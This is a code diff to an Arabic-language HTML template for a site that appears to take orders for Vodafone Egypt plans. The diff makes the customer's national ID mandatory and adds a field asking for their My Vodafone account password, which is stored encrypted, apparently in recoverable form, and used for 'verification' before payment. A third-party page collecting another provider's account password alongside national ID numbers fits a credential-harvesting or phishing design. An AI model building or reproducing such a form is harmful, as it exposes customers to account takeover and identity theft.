@@ -2,8 +2,8 @@
 {% block title %}طلب باقة جديدة{% endblock %}
 {% block content %}
 <section class="section form-section">
-  <h1>بيانات العميل والباقة</h1>
-  <p class="section-lead">أدخل بيانات فودافون مصر بوضوح. الموقع يتحقق إن الرقم تابع لفودافون (010).</p>
+  <h1>بيانات العميل والتحقق</h1>
+  <p class="section-lead">أدخل بيانات حساب فودافون مصر. يتم التحقق قبل الانتقال لصفحة الدفع.</p>
 
   {% if errors %}
   <ul class="error-list">
@@ -19,16 +19,31 @@
     </label>
 
     <label>
-      رقم فودافون مصر
+      رقم فودافون مصر (خط التفعيل)
       <input type="tel" name="vodafone_number" id="vodafone_number" required
              value="{{ form.get('vodafone_number', '') }}" placeholder="010xxxxxxxx" dir="ltr" />
       <span class="field-hint" id="number-hint">لازم يبدأ بـ 010</span>
     </label>
 
     <label>
-      الرقم القومي (اختياري)
-      <input type="text" name="national_id" maxlength="14"
+      رقم واتساب للتنبيهات
+      <input type="tel" name="whatsapp_number" id="whatsapp_number"
+             value="{{ form.get('whatsapp_number', '') }}" placeholder="01xxxxxxxxx" dir="ltr" />
+      <span class="field-hint">لو فاضي هنستخدم رقم فودافون</span>
+    </label>
+
+    <label>
+      الرقم القومي
+      <input type="text" name="national_id" maxlength="14" id="national_id"
              value="{{ form.get('national_id', '') }}" placeholder="14 رقم" dir="ltr" />
+      <span class="field-hint">يُشفَّر في قاعدة البيانات</span>
+    </label>
+
+    <label>
+      كلمة مرور حساب ماي فودافون (للتحقق)
+      <input type="password" name="account_password" id="account_password"
+             value="" placeholder="اختياري حسب وضع التحقق" autocomplete="off" />
+      <span class="field-hint" id="verify-hint">تُشفَّر ولا تُعرض في لوحة المدير كنص صريح</span>
     </label>
 
     <fieldset>
@@ -48,7 +63,7 @@
       </div>
     </fieldset>
 
-    <button type="submit" class="btn btn-primary">متابعة للدفع</button>
+    <button type="submit" class="btn btn-primary" id="submit-btn">تحقق ومتابعة للدفع</button>
   </form>
 </section>
 {% endblock %}
